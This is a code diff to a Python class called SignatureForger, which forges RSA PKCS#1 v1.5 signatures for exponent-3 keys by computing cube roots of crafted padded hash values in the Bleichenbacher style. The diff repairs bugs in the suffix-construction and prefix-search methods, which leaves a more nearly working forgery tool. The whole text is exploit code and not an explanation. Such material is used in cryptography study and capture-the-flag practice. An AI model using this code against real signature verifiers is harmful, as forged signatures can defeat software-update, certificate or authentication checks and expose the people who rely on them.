@@ -3,6 +3,7 @@
 import binascii
 import hashlib
 import gmpy2
+import os
 
 HASH_ASN1 = {
 'MD5': b'\x30\x20\x30\x0c\x06\x08\x2a\x86\x48\x86\xf7\x0d\x02\x05\x05\x00\x04\x10',
@@ -42,43 +43,44 @@ class SignatureForger:
 		self.hashAlg = hashAlg
 		self.method = method
 
+	def getBitAt(self, idx, val):
+		return (val >> idx) & 0x01
+
+	def setBitAt(self, idx, val):
+		return val | (0x01 << idx)
+
+	def toInt(self, val):
+		return int(val.encode("hex"), 16)
+
+	def toBytes(self, val):
+		hexVal = hex(val)[2:-1]
+		if len(hexVal) % 2 == 1:
+			hexVal = "0"+hexVal
+		return hexVal.decode("hex")
+
 	def encodePkcs1Suffix(self, message):
 		messageHash = self.hashAlg.digester(message).digest()
-		print(messageHash.encode("hex"))
 		if ord(messageHash[-1]) & 0x01 != 0x01:
 			print("hash value must be uneven. Try a different message")
 			exit()
 		suffix = "\x00" + self.hashAlg.digestInfo + messageHash
 		return suffix
-
-	def getBitAt(self, idx, val):
-		return (ord(val) >> idx) & 0x01
-
-	def setBitAt(self, idx, val):
-		return val | (0x01 << (idx - 1))
-
-
+	
 	def constructSignatureSuffix(self, suffix):
 		signatureSuffix = 1
 		for idx in range(len(suffix) * 8):
-			if self.getBitAt(idx, signatureSuffix ** 3) != self.getBitAt(idx, suffix):
-				signatureSuffix = selfsetBitAt(idx, signatureSuffix)
+			if self.getBitAt(idx, signatureSuffix ** 3) != self.getBitAt(idx, self.toInt(suffix)):
+				signatureSuffix = self.setBitAt(idx, signatureSuffix)
 		return signatureSuffix
 
-	def toInt(val):
-		return int(val.encode("hex"), 16)
-
-	def toBytes(val):
-		return hex(val)[2,-1].decode("hex")
-
-	def addPrefixTosignature(self, signatureSuffix):
+	def addPrefixToSignature(self, signatureSuffix):
 		prefix = "\x00\x01"
 		prefix += "\xFF"*8
 		while True:
 			testPrefix = prefix + os.urandom((self.keysize/8) - (len(prefix)))
-			signatureCandidate = toBytes(gmpy2.cbrt(int(testPrefix, 16))) + "\x00" + signatureSuffix
-			toCheck = toBytes(toInt(signatureCandidat) ** 3)[:-len(signatureSuffix)+1]
-			if "\x00" not in toCheck:
+			signatureCandidate = self.toBytes(int(gmpy2.cbrt(self.toInt(testPrefix))))[:-len(self.toBytes(signatureSuffix))] + self.toBytes(signatureSuffix)
+			toCheck = self.toBytes(self.toInt(signatureCandidate) ** 3)
+			if "\x00" not in toCheck[:-len(self.toBytes(signatureSuffix))]:
 				return signatureCandidate
 
 
